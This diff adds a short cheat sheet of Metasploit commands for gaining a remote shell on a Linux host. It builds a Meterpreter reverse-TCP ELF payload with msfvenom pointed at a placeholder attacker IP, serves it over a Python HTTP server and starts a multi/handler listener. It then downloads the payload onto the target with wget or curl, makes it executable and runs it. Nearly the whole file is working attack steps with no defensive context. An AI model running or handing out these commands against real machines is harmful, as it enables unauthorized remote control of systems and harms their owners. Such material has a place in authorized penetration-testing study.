@@ -1,0 +1,23 @@
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f elf -o shell.elf
+
+# Start the server in the same directory as shell.elf
+python3 -m http.server 80
+
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST <ATTACKER_IP>
+set LPORT <LPORT>
+run
+
+# Download the binary from your HTTP server
+cd /tmp
+wget http://<ATTACKER_IP>/shell.elf
+# Or use: curl -O http://<ATTACKER_IP>/shell.elf
+
+# Give execution permissions
+chmod +x shell.elf
+
+# Execute the binary
+./shell.elf
